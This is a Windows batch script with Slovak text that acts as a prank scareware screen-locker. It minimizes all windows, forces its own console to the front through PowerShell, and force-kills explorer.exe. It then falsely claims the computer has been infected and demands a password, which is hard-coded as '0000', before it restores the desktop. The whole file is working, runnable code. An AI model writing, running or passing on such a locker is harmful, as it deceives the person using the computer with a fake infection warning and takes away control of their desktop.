@echo off
chcp 65001 > nul
title Virus!!!

:: Minimalizuje všetky okná
powershell -command "(new-object -comobject shell.application).MinimizeAll()" > nul

:: Časový posun, aby sa všetko minimalizovalo
timeout /t 1 /nobreak >nul

:: Obnoví okno s názvom "Virus!!!"
powershell -command "$handle = (Get-Process | where {$_.MainWindowTitle -like '*Virus!!!*'}).MainWindowHandle; Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class User32 { [DllImport(\"user32.dll\")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow); }'; [User32]::ShowWindowAsync($handle, 9)" > nul


taskkill /f /im explorer.exe > nul
:start
echo Váš počítač bol nakazený vírusom,
echo Ak tento výrus nefunguje kontaktujte Jakuba Zápražného.
set /p heslo="Zadajte heslo pre odblokovanie výrusu: "
if %heslo% == 0000 (
    cls
    echo Heslo je správne
    explorer
) else (
    echo Heslo je nesprávne skúste to znova
    timeout /nobreak /t 5 > nul
    cls
    goto :start
)
exit /b 0
